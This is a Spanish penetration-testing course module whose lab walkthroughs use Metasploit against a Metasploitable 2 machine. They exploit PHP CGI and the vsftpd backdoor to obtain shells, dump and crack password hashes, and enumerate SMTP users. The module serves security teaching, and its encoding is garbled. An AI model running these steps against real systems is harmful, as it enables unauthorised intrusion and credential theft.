# Detecci√≥n y explotaci√≥n de vulnerabilidades:

## Identificaci√≥n y explotaci√≥n de vulnerabilidades conocidas

La identificaci√≥n y explotaci√≥n de vulnerabilidades conocidas es una fase cr√≠tica en las pruebas de penetraci√≥n, y se lleva a cabo despu√©s de recopilar informaci√≥n sobre el objetivo y de identificar posibles debilidades en los sistemas y servicios. Aqu√≠ se describen pasos generales y algunas t√©cnicas comunes utilizadas en esta fase:

- **Base de Datos de Vulnerabilidades:** Utilizar bases de datos de vulnerabilidades, como el NIST National Vulnerability Database (NVD) o el Common Vulnerabilities and Exposures (CVE), para identificar vulnerabilidades conocidas.
- **Escaneo de Vulnerabilidades:** Utilizar herramientas automatizadas como Nessus, OpenVAS, o Nexpose para realizar escaneos de vulnerabilidades en los sistemas y servicios objetivo.
- **An√°lisis de Resultados:** Revisar los informes generados por las herramientas de escaneo de vulnerabilidades para identificar las debilidades detectadas y evaluar su criticidad.
- **Priorizaci√≥n de Vulnerabilidades:** Clasificar las vulnerabilidades identificadas seg√∫n su gravedad y su impacto potencial en la seguridad del sistema.
- **Validaci√≥n Manual:** Validar manualmente las vulnerabilidades identificadas para confirmar su existencia y evaluar la posibilidad de explotaci√≥n.
- **Explotaci√≥n Controlada:** En caso de contar con autorizaci√≥n expl√≠cita, realizar pruebas de explotaci√≥n controlada para verificar la efectividad de las vulnerabilidades identificadas.
- **Documentaci√≥n de Hallazgos:** Documentar de manera detallada todas las vulnerabilidades identificadas, incluyendo informaci√≥n sobre su naturaleza, impacto y recomendaciones para la mitigaci√≥n.

Es importante llevar a cabo estas actividades dentro del alcance √©tico y legal de la prueba, obteniendo siempre el consentimiento del propietario del sistema o red. Adem√°s, la comunicaci√≥n transparente de los hallazgos es crucial para facilitar la mitigaci√≥n y mejorar la seguridad del entorno evaluado.

## Tipos de explotaci√≥n de vulnerabilidades

Existen muchos tipos de explotaci√≥n de vulnerabilidades:

1. **Vulnerabilidades de aplicaci√≥n**: Estas vulnerabilidades est√°n relacionadas con los errores de programaci√≥n en la aplicaci√≥n. Esto puede permitir que un atacante explote el c√≥digo vulnerable para comprometer la seguridad de la misma. Estas vulnerabilidades generalmente se encuentran en el lado del cliente, como sitios web, aplicaciones m√≥viles, aplicaciones de escritorio y aplicaciones de servidor.

2. **Vulnerabilidades de red:** Estas vulnerabilidades se encuentran en el nivel de red debido a la mala configuraci√≥n de los firewalls, protocolos y servicios en la infraestructura. Esto puede permitir que un atacante explote la red para obtener acceso no autorizado.

3. **Vulnerabilidades de servidor:** Estas vulnerabilidades se encuentran en los servidores y est√°n relacionadas con la mala configuraci√≥n de los servidores. Esto puede permitir que un atacante explote el servidor para obtener acceso no autorizado.

4. **Vulnerabilidades de software:** Estas vulnerabilidades se encuentran en el software instalado en el sistema. Esto puede permitir que un atacante explote las vulnerabilidades del mismo para obtener acceso no autorizado.

5. **Vulnerabilidades de hardware:** Estas vulnerabilidades se encuentran en el hardware de la computadora. Esto puede permitir que un atacante explote el hardware para obtener acceso no autorizado.


## Recomendaciones importantes

Es importante entender c√≥mo combatir estos tipos de explotaci√≥n de vulnerabilidades. Aqu√≠ te dejamos algunas recomendaciones:

- Implementar controles de seguridad efectivos, como firewalls, antivirus, antispam y herramientas de filtrado de contenido.
- Monitorear los sistemas de forma continua para detectar y responder a los intentos de explotaci√≥n de vulnerabilidades.
- Asegurarse de que todos los sistemas est√©n actualizados y las vulnerabilidades sean mitigadas de forma adecuada.
- Utilizar una soluci√≥n de seguridad que se centre en la prevenci√≥n, incluso si se detectan intentos de explotaci√≥n.
- Realizar pruebas de Hacking √âtico o Ethical Hacking peri√≥dicas para detectar vulnerabilidades o fallos de seguridad.
- Utilizar soluciones de seguridad basadas en la nube para mejorar la seguridad y la gesti√≥n de los sistemas.
- Proporcionar educaci√≥n y capacitaci√≥n a los usuarios finales para reducir los riesgos de explotaci√≥n de vulnerabilidades.

La mejor manera de protegerse de la explotaci√≥n de vulnerabilidades es mediante la implementaci√≥n de buenas pr√°cticas de seguridad y la adopci√≥n de soluciones de seguridad eficaces. Por lo tanto, es importante tomar medidas c√≥mo las anteriores para protegerse de un ciberataque.

# **Uso de exploits y herramientas automatizadas.**

El uso de exploits y herramientas automatizadas es una parte esencial de las pruebas de penetraci√≥n, pero debe llevarse a cabo con responsabilidad y √©tica. Aqu√≠ se describen las consideraciones y pasos generales para el uso de exploits y herramientas automatizadas en el contexto de una evaluaci√≥n de seguridad:

- **Consentimiento del Propietario:** Obtener el consentimiento expl√≠cito del propietario del sistema o red antes de utilizar exploits o realizar pruebas de penetraci√≥n.
- **Entendimiento del Alcance:** Clarificar y entender claramente el alcance de la prueba, incluyendo los sistemas y servicios espec√≠ficos que est√°n autorizados para ser evaluados.
- **Documentaci√≥n Detallada:** Documentar de manera detallada cada acci√≥n realizada, incluyendo el uso de exploits y herramientas automatizadas, junto con sus resultados.
- **Mitigaci√≥n de Riesgos:** Evaluar y mitigar cualquier riesgo potencial asociado con el uso de exploits, asegur√°ndose de no causar da√±o irreparable.
- **Priorizaci√≥n de Vulnerabilidades:** Priorizar el uso de exploits en funci√≥n de la gravedad y el impacto potencial de las vulnerabilidades identificadas.

## **Paso a paso**

- **Identificaci√≥n de Vulnerabilidades:** Utilizar herramientas de escaneo y an√°lisis para identificar vulnerabilidades en sistemas y servicios.
- **Selecci√≥n de Exploits:** Seleccionar exploits espec√≠ficos que sean relevantes para las vulnerabilidades identificadas.
- **Pruebas Controladas:** Realizar pruebas de penetraci√≥n controladas utilizando exploits, asegur√°ndose de no causar da√±o no autorizado.
- **Validaci√≥n Manual:** Validar manualmente la existencia de las vulnerabilidades y la efectividad de los exploits utilizados.
- **Documentaci√≥n de Resultados:** Documentar los resultados de las pruebas, incluyendo detalles sobre la explotaci√≥n exitosa o cualquier problema encontrado.
- **Comunicaci√≥n Transparente:** Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, los resultados obtenidos y las recomendaciones de mitigaci√≥n.

## **Herramientas Comunes para Uso de Exploits y Automatizaci√≥n:**

**Metasploit:** Marco de desarrollo de pruebas de penetraci√≥n con una amplia variedad de m√≥dulos de exploits.

> Uso: Pruebas controladas de explotaci√≥n para validar vulnerabilidades.

**ExploitDB:** Base de datos de exploits y t√©cnicas de penetraci√≥n.

> Uso: B√∫squeda y selecci√≥n de exploits espec√≠ficos.

**AutoSploit:** Herramienta de automatizaci√≥n que selecciona exploits de manera autom√°tica.

> Uso: Pruebas automatizadas de vulnerabilidades.

**Armitage:** Interfaz gr√°fica para Metasploit con funciones de automatizaci√≥n.

> Uso: Facilita la gesti√≥n y ejecuci√≥n de exploits.

# **Pruebas de penetraci√≥n en servicios comunes (por ejemplo, HTTP, FTP).**

Las pruebas de penetraci√≥n en servicios como HTTP, FTP, SSH, TELNET son esenciales para evaluar la seguridad de un sistema. A continuaci√≥n, se describen algunos pasos generales y t√©cnicas comunes utilizadas en este tipo de pruebas utilizaremos Metasploit y Metasploitable:

## **HTTP (Servidor Web):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo HTTP en el puerto 80 y HTTPS en el puerto 443.
- **An√°lisis de Tecnolog√≠as Web:** Utilizar herramientas como Wappalyzer o BuiltWith para identificar las tecnolog√≠as y plataformas web utilizadas en el servidor.
- **Enumeraci√≥n de Directorios y Archivos:** Utilizar herramientas como dirb, dirbuster o gobuster para enumerar directorios y archivos en el servidor web.
- **Escaneo de Vulnerabilidades Web:** Utilizar herramientas como Nikto o OWASP ZAP para realizar escaneos de vulnerabilidades en la aplicaci√≥n web.
- **Explotaci√≥n de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas, utilizar exploits apropiados para verificar la explotaci√≥n controlada.
- **Inyecci√≥n de SQL y XSS:** Probar la seguridad contra inyecciones SQL y ataques de scripting entre sitios (XSS) utilizando herramientas como SQLMap o Burp Suite.

El puerto 80 es el puerto predeterminado para los servicios http (p√°ginas web). En un an√°lisis anterior determinamos que el puerto 80 est√° abierto. Ahora es el momento de determinar qu√© se ejecuta detr√°s de ese puerto.

Buscamos cual es la IP. En este caso es 192.168.1.49.

![IP caso](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ipcaso.png?raw=true)

Primero haz un escaneo de nmap:

> Db_nmap -sV 192.168.1.49 -p 80

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

Es Apache ejecut√°ndose en Ubuntu. Intentemos recopilar m√°s informaci√≥n con un esc√°ner auxiliar:

> use auxiliary/scanner/http/http_version
> 
> 
> *> show options*
> 

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> *set RHOST 192.168.1.49*
> 
> 
> *> run*
> 

![RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/RHOST.png?raw=true)

Es Apache 2.2.8 con PHP 5.2.4. Podemos navegar hasta ' [http://192.168.231.109/phpinfo.php](http://metasploitable/phpinfo.php) ' y confirmar la informaci√≥n ya recopilada:

![Apache](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache.png?raw=true)

Probemos otros m√≥dulos http para obtener m√°s informaci√≥n sobre nuestro servidor:

'dir_listing' determinar√° si el listado de directorios est√° habilitado:

*> use auxiliary/scanner/http/dir_listing*

*> show options*

![Show options](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-options.png?raw=true)

*set RHOST 192.168.1.49*

*> run*

![Run](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run.png?raw=true)

Sin suerte. 'dir_scanner' buscar√° directorios interesantes:

*> use auxiliary/scanner/http/dir_scanner*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run Set](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-set.png?raw=true)

Tenemos 6 directorios. Revisar su contenido podr√≠a darnos una ventaja para hackear nuestro objetivo. Probemos con otro m√≥dulo, 'files_dir':

*> use auxiliary/scanner/http/files_dir*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-rhost.png?raw=true)

Una vez m√°s, estos resultados podr√≠an marcar la diferencia y deber√≠amos echarles un vistazo. Otro m√≥dulo de inter√©s id 'options', 'robots_txt' y 'verb_auth_bypass':

*> use auxiliary/scanner/http/verb_auth_bypass*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run proxies](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-proxies.png?raw=true)

> Y muchos m√≥dulos m√°s que te invito a probar.
> 
> 
> Hagamos uso de la informaci√≥n que recopilamos.
> 
> Busquemos en exploitDB Apache con la versi√≥n de PHP:
> 
> *$ searchsploit apache | grep 5.4.2*
> 

![Apache1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache1.png?raw=true)
Se encontr√≥ ejecuci√≥n remota de c√≥digo CGI. Explot√©moslo:

*> use exploit/multi/http/php_cgi_arg_injection*

*set RHOST 192.168.1.49*

*>run*

![Run Exploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-exploit.png?raw=true)

¬°¬°Tenemos un shell meterpreter!! ¬°¬°¬°Happy hacking!!!

El puerto 80 es una buena fuente de informaci√≥n y aprovecha como cualquier otro puerto. Volveremos a este puerto para las aplicaciones web instaladas. En este art√≠culo obtuvimos informaci√≥n sobre los servicios en ejecuci√≥n y encontramos un exploit que nos proporcion√≥ un shell.

## **FTP (Protocolo de Transferencia de Archivos):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo FTP en el puerto 21.
- **Enumeraci√≥n de Usuarios An√≥nimos:** Verificar si el servidor FTP permite conexiones an√≥nimas y si ofrece acceso a informaci√≥n sensible.
- **Intentos de Acceso No Autorizado:** Intentar acceder al servidor FTP con credenciales d√©biles o por defecto para evaluar la seguridad de autenticaci√≥n.
- **Escaneo de Directorios:** Utilizar herramientas como Nmap o dirb para escanear directorios en el servidor FTP.
- **Transferencia de Archivos:** Subir y descargar archivos para evaluar la integridad del control de acceso y la seguridad del sistema.
- **Explotaci√≥n de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas en el servidor FTP, utilizar exploits apropiados para verificar la explotaci√≥n controlada.

## **Escaneo y ataque del puerto 21 con Metasploitable 2**

Comprobemos el estado de la base de datos, creemos nuestro espacio de trabajo y configuremos nuestros RHOSTS globales, para no ingresarlos en cada intento:

![Escaneo y Ataque](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/escaneo-ataque.png?raw=true)

Comenzaremos con el puerto 21, el puerto predeterminado de ftp.

Dentro del marco de metasploit, ejecutaremos un an√°lisis del servicio nmap dirigido al puerto 21:

> > db_nmap -p 21 192.168.231.109 -A -sV -sC
> 

MSF tambi√©n dispone de un m√≥dulo auxiliar para ftp:

> > use auxiliary/scanner/ftp/ftp_version
> 
> 
> *> run*
> 

![auxiliary](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/auxiliary.png?raw=true)

*Veamos los resultados de nuestro escaneo de puertos:*

# Untitled

*Veamos los resultados de nuestro escaneo de puertos:*

![resultado Puertos](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/resultado-puertos.png?raw=true)

*Disponemos de un Servidor FTP, concretamente vsFTP 2.3.4. correr. Hagamos una b√∫squeda en exploitDB a trav√©s de searchploit:*

> $ searchsploit vsftp

![searchsploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/searchsploit.png?raw=true)

*Como podemos ver, existe un exploit de ejecuci√≥n de comandos de puerta trasera para nuestra versi√≥n de vsftp. Volvamos a MSF, busquemos el exploit, carguemoslo, veamos su informaci√≥n y ejec√∫telo:*

> grep vsftp search exploits

![grep vsftp](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/grep-vsftp.png?raw=true)

> use exploit/unix/ftp/vsftp_234_backdoor

> *show info*

![show info](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-info.png?raw=true)

> run

![run3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run3.png?raw=true)

*Y ahora tenemos un shell en la sesi√≥n 2. Podemos enviarlo al fondo (^Z), enumerar las sesiones abiertas (sesiones -l) e interactuar (sesiones 2)*

![Sesiones](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sesiones.png?raw=true)

*Intentaremos extraer usuarios y contrase√±as del objetivo utilizando el m√≥dulo hashdump. Ponga la sesi√≥n en segundo plano y seleccione el m√≥dulo:*

![Hashdump](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/hashdump.png?raw=true)

> use post/linux/gather/hashdump

> *show options*

> *set SESSION 2*

> *show info*

> *run*

*Ahora usa el comando 'loot' para ver los resultados hasta el momento:*

> loot

![loot](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/loot.png?raw=true)

*Pudimos obtener los archivos passwd, shadow y unshadow.*

*Abra otra terminal para que John el Destripador los abra:*

> $ john .msf4/loot/20190402110303_metasploitable2_192.168.231.109_linux.hashes_935091.txt

*Para ver los resultados utilice la opci√≥n --show:*

![show](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show.png?raw=true)

*Escaneamos el puerto 21 y determinamos que una versi√≥n vulnerable estaba ejecutando el servicio FTP. Usando MSF pudimos:*

- *crear una sesi√≥n remota,*
- *obtener los archivos /etc/passwd y /etc/shadow*
- *obtener credenciales de acceso usando John the Ripper*

## ***Puerto 25 SMTP (Simple Mail Transfer Protocol)***

*Las pruebas de penetraci√≥n en SMTP (Simple Mail Transfer Protocol) son esenciales para evaluar la seguridad de los servidores de correo electr√≥nico. A continuaci√≥n, se describen las fases clave de las pruebas de penetraci√≥n en SMTP:*

- *Reconocimiento:*
    - *Identificaci√≥n del servidor SMTP: Determina las direcciones IP y los nombres de dominio asociados con el servidor de correo electr√≥nico objetivo.*
    - *Enumeraci√≥n de usuarios: Recopila informaci√≥n sobre usuarios v√°lidos, lo que podr√≠a facilitar ataques de fuerza bruta o de diccionario.*
- *An√°lisis de Configuraci√≥n:*
    - *Verificaci√≥n de restricciones de acceso: Eval√∫a las pol√≠ticas de acceso, como las restricciones basadas en direcciones IP.*
    - *Validaci√≥n de filtrado de contenido: Asegura que el servidor filtre contenido malicioso y maneje adecuadamente los archivos adjuntos.*
- *Ataques de Fuerza Bruta: Realiza intentos de inicio de sesi√≥n con contrase√±as comunes o d√©biles para evaluar la resistencia del sistema.*
- *Verificaci√≥n de Autenticaci√≥n: Autenticaci√≥n segura: Confirma que las pol√≠ticas de autenticaci√≥n, como STARTTLS, se implementan de manera segura.*
- *Pruebas de Relay Abierto: Comprueba si el servidor permite el reenv√≠o de correos electr√≥nicos sin autenticaci√≥n, lo cual puede ser explotado por atacantes.*
- *Ataques de Inyecci√≥n de Correo Electr√≥nico: Eval√∫a la capacidad del servidor para resistir ataques de manipulaci√≥n de encabezados de correo electr√≥nico.*
- *Inyecci√≥n de contenido: Verifica la resistencia a la inyecci√≥n de contenido malicioso en el cuerpo del correo electr√≥nico.*
- *Exploraci√≥n de Vulnerabilidades: Identifica posibles servicios relacionados con el correo electr√≥nico que podr√≠an tener vulnerabilidades.*
- *Pruebas contra servidores web asociados: Eval√∫a la seguridad de aplicaciones web relacionadas con el correo electr√≥nico.*
- *An√°lisis de Reglas Antispam: Intenta enviar correos electr√≥nicos maliciosos sin ser detectado por los filtros antispam.*
- *Retenci√≥n y eliminaci√≥n de mensajes: Verifica si el servidor sigue las pol√≠ticas de retenci√≥n y eliminaci√≥n de mensajes.*
- *Documentaci√≥n detallada: Proporciona informes detallados de las vulnerabilidades encontradas, junto con recomendaciones para su mitigaci√≥n.*
- *Las pruebas de penetraci√≥n en SMTP son fundamentales para garantizar la integridad y la seguridad de las comunicaciones por correo electr√≥nico en una organizaci√≥n.*

## ***Escaneo y ataque del puerto 25 con Metasploitable 2***

*Nuestra primera tarea es determinar qu√© software y versi√≥n se ejecuta detr√°s del puerto 25. Usemos nmap:*

> db_nmap -p 25 -sC -sV -A 192.168.231.109

![db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> use auxiliary/scanner/smtp/smtp_version

*Despu√©s de ejecutar el m√≥dulo, aqu√≠ est√°n los resultados:*

![smtp_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp_version.png?raw=true)

*Como hicimos en la parte II, busquemos en exploitDB, google, etc.*

*MSF tiene un m√≥dulo de enumeraci√≥n de usuarios para SMTP.*

> use auxiliar/scanner/smtp/smtp_enum
> *run*

![SMTP](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp.png?raw=true)

*El m√≥dulo pudo extraer una lista de usuarios. Ahora podemos intentar entrar por la fuerza bruta con estos usuarios.*

## ***Comandos SMTP 25***

*SMTP significa Protocolo simple de transporte de correo y es un protocolo de servidor a servidor y mantiene una base de datos local de usuarios a los que debe enviar y recibir correos electr√≥nicos.*

*SMTP tiene un conjunto de comandos ( [v√©alos aqu√≠](http://www.tcpipguide.com/free/t_SMTPCommands-2.htm) ). Nos conectaremos a nuestro objetivo a trav√©s del puerto 25 e intentaremos adquirir los correos electr√≥nicos de esta base de datos. Abra una nueva terminal y escriba:*

```bash
$ nc 192.168.231.109 25
```

*Ya estamos dentro. Usemos el comando 'VRFY' para enumerar los usuarios:*

```bash
VRFY user
```

![VRFY](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/vrfy.png?raw=true)

*En lugar de hacer esto a mano, usemos una herramienta de nuestro cintur√≥n de herramientas: smtp-user-enum.*

![smtp-user-enum](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp-user-enum.png?raw=true)

*Ejecutando la opci√≥n `-h` podemos ver el uso. Usaremos una lista de palabras de Kali:*

```bash
$ smpt-users-enum -M VRFY -U /usr/share/wordlist/fern-wifi -t 192.168.231.109
```

![wordlist](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wordlist.png?raw=true)

*Hemos escaneado el puerto 25 (SMTP). Despu√©s de obtener m√°s informaci√≥n sobre el servicio, decidimos intentar enumerar los usuarios existentes, lo que hicimos primero con el marco metasploit y luego con la herramienta smtp-users-enum.*

# ***Consideraciones Generales:***

- *Consentimiento del Propietario: Obtener el consentimiento expl√≠cito del propietario del sistema antes de realizar pruebas de penetraci√≥n.*
- *Uso de Herramientas Especializadas: Utilizar herramientas especializadas, como Hydra para SSH y Telnet, o CrackMapExec para SMB y RDP, para realizar pruebas controladas.*
- *Documentaci√≥n Detallada: Documentar cada acci√≥n realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.*
- *Comunicaci√≥n Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.*
- *Es esencial llevar a cabo estas actividades de manera √©tica y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables.*
- *Seguimiento √âtico y Legal: Realizar todas las actividades dentro de los l√≠mites √©ticos y legales, evitando cualquier da√±o no autorizado.*

5. Escalada de privilegios:

# **B√∫squeda de vulnerabilidades de escalada de privilegios.**

La b√∫squeda de vulnerabilidades de escalada de privilegios es crucial para evaluar la seguridad de un sistema y prevenir posibles amenazas. Aqu√≠ se describen algunos pasos y t√©cnicas comunes utilizadas para identificar vulnerabilidades que podr√≠an permitir a un atacante elevar sus privilegios:

- **Recolecci√≥n de Informaci√≥n:** Obtener informaci√≥n detallada sobre el sistema, incluyendo la versi√≥n del sistema operativo, servicios en ejecuci√≥n y configuraciones de seguridad.
- **Enumeraci√≥n de Usuarios y Grupos:** Utilizar comandos y herramientas como whoami, id, o net user para enumerar usuarios y grupos en el sistema.
- **Revisi√≥n de Pol√≠ticas de Seguridad:** Examinar las pol√≠ticas de seguridad del sistema para comprender las restricciones y configuraciones de acceso.
- **An√°lisis de Configuraciones:** Revisar las configuraciones de seguridad, como permisos de archivos, configuraciones de servicios y pol√≠ticas de control de acceso.
- **B√∫squeda de Vulnerabilidades Conocidas:** Utilizar bases de datos de vulnerabilidades, esc√°neres de vulnerabilidades y herramientas como Nessus o OpenVAS para identificar vulnerabilidades conocidas.
- **Pruebas Activas de Escalada de Privilegios:** Realizar pruebas activas, como intentos de explotaci√≥n, para identificar vulnerabilidades que podr√≠an conducir a la escalada de privilegios.

## **T√©cnicas Comunes:**

- **Elevaci√≥n de Privilegios del Usuario:** Buscar vulnerabilidades que permitan a un usuario regular elevar sus privilegios a niveles m√°s altos.
- **Explotaci√≥n de Servicios y Aplicaciones:** Buscar vulnerabilidades en servicios y aplicaciones que podr√≠an permitir la ejecuci√≥n de c√≥digo con privilegios elevados.
- **Ataques a Configuraciones D√©biles:** Identificar configuraciones de seguridad d√©biles o malas pr√°cticas que puedan ser explotadas para la escalada de privilegios.
- **Escalada de Privilegios a Nivel de Sistema:** Buscar vulnerabilidades que permitan a un usuario obtener privilegios de administrador o de sistema.
- **Explotaci√≥n de Servidores:** Investigar vulnerabilidades espec√≠ficas de servidores que puedan ser explotadas para la escalada de privilegios.

## **Herramientas Comunes:**

- **Windows-Exploit-Suggester:** Herramienta para identificar posibles exploits en sistemas Windows.
    - **Uso:** B√∫squeda de exploits para versiones espec√≠ficas de Windows.
- **Linux Exploit Suggester:** Herramienta para identificar posibles exploits en sistemas Linux.
    - **Uso:** B√∫squeda de exploits para versiones espec√≠ficas de sistemas Linux.
- **PowerUp:** PowerShell script para enumerar informaci√≥n y buscar vulnerabilidades en sistemas Windows.
    - **Uso:** Identificaci√≥n de posibles vectores de escalada de privilegios.
- **BeRoot:** Herramienta para verificar configuraciones y buscar vulnerabilidades en sistemas Linux.
    - **Uso:** B√∫squeda de debilidades que podr√≠an conducir a la escalada de privilegios.
    

> üëâ Es crucial llevar a cabo estas actividades de manera √©tica y responsable, obteniendo siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La comunicaci√≥n transparente de los hallazgos es fundamental para facilitar la mitigaci√≥n y mejorar la seguridad del sistema evaluado.

# **Uso de t√©cnicas b√°sicas para elevar los privilegios.**

El uso de t√©cnicas b√°sicas para elevar los privilegios es un componente cr√≠tico en las pruebas de penetraci√≥n. Aqu√≠ se describen algunas t√©cnicas comunes que los profesionales de seguridad pueden utilizar para identificar y explotar vulnerabilidades que conduzcan a la escalada de privilegios:

1.  Explotaci√≥n de Servicios Vulnerables: Identificar servicios en ejecuci√≥n con vulnerabilidades conocidas y utilizar exploits espec√≠ficos para elevar los privilegios.
2.  Explotaci√≥n de Configuraciones D√©biles: Identificar configuraciones incorrectas o d√©biles que permitan la escalada de privilegios, como permisos inadecuados en archivos o directorios.
3. Inyecci√≥n de Comandos: Explotar vulnerabilidades que permitan la inyecci√≥n de comandos para ejecutar c√≥digo arbitrario con privilegios elevados.
4.  Explotaci√≥n de Vulnerabilidades de D√≠a Cero: Utilizar exploits de vulnerabilidades de d√≠a cero que a√∫n no han sido parcheadas por el fabricante.
5.  Ataques de Fuerza Bruta: Realizar ataques de fuerza bruta para obtener acceso no autorizado a cuentas de usuario con privilegios m√°s altos.
6.  Uso de Herramientas de Explotaci√≥n: Utilizar herramientas especializadas como Metasploit, PowerShell Empire o Covenant para automatizar la explotaci√≥n de vulnerabilidades y la escalada de privilegios.
7.  Explotaci√≥n de Servidores con Permisos Elevados: Identificar servicios que se ejecutan con privilegios elevados y buscar vulnerabilidades que permitan la manipulaci√≥n de esos servicios.
8.  Manipulaci√≥n de Tokens de Acceso: Modificar tokens de acceso para obtener privilegios adicionales en el sistema.
9.  Uso de Exploits para Escalada de Privilegios Espec√≠ficos del Sistema Operativo: Utilizar exploits espec√≠ficos para la escalada de privilegios en sistemas operativos particulares, como Windows o Linux.
10.  Explotaci√≥n de Vulnerabilidades de Aplicaciones Web: Identificar vulnerabilidades en aplicaciones web que permitan la escalada de privilegios a nivel de sistema.

## **Consideraciones Importantes:**

- Consentimiento del Propietario: Obtener el consentimiento expl√≠cito del propietario del sistema antes de realizar pruebas de penetraci√≥n.
- Documentaci√≥n Detallada: Documentar cada acci√≥n realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.
- Seguimiento √âtico y Legal: Realizar todas las actividades dentro de los l√≠mites √©ticos y legales, evitando cualquier da√±o no autorizado.
- Comunicaci√≥n Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.

> üí° Es esencial llevar a cabo estas actividades de manera √©tica y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La escalada de privilegios debe ser realizada con el objetivo de mejorar la seguridad del sistema, identificar debilidades y facilitar la mitigaci√≥n.

# **Obtenci√≥n de acceso privilegiado en el sistema objetivo**

La escalada de privilegios es el acto de explotar un error, una falla de dise√±o o la supervisi√≥n de la configuraci√≥n en un sistema operativo o aplicaci√≥n de software para obtener un acceso elevado a los recursos que normalmente est√°n protegidos de una aplicaci√≥n o usuario. Vamos a utilizar una distro de Linux vulnerable para poner un ejemplo de elevaci√≥n de privilegios, se trata de Metasploitable II. Nuestra m√°quina atacante ser√° un Kali Linux. El proceso que se va a llevar a cabo de manera resumida es el siguiente:

1. Buscamos los servicios que est√°n corriendo en la m√°quina Metasploitable.
2. Comprobamos si tiene vulnerabilidades.
3. Explotamos la vulnerabilidad que escogemos.
4. Estamos dentro con privilegios limitados, as√≠ que buscamos procesos corriendo como root y que no pertenezcan al kernel.
5. Buscamos un exploit que nos permita elevarnos y lo ejecutamos.

### Las m√°quinas y sus IPs son las siguientes:

- Kali Linux > 192.168.1.50
- Metasploitable II > 192.168.1.49

Buscando servicios en la m√°quina v√≠ctima. Para esta tarea usaremos nmap, el comando a ejecutar:

```bash
nmap -p 1-65535 -T4 -sV 192.168.1.49
```


Como se va a usar Metasploit, podemos hacer uso de nmap en la propia herramienta (db_nmap), el resultado va a ser el mismo, pero se guardar√°n los resultados en la base de datos, para no perdernos antes borramos la base de datos con ‚Äúclear database‚Äù. La salida (no completa) se muestra en la siguiente captura:

![captura](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/captura.png?raw=true)

Ahora podemos consultar los servicios todas las veces que queramos con el comando services de Metasploit.

## Buscamos posibles exploits

Vamos a centrarnos en el puerto 21, el servicio FTP, y buscamos un posible exploit:

![exploits](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploits.png?raw=true)

Encontramos un exploit disponible para la versi√≥n que est√° corriendo en la m√°quina v√≠ctima. Configuramos el exploit y lo lanzamos:

![exploit disponible](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploit-disponible.png?raw=true)

Ya estamos dentro de la m√°quina v√≠ctima, y encima con el usuario root, que m√°s se puede pedir. En el pr√≥ximo post veremos que no siempre es tan f√°cil conseguir altos privilegios, y tendremos que trabajar un poco m√°s para llegar a ello.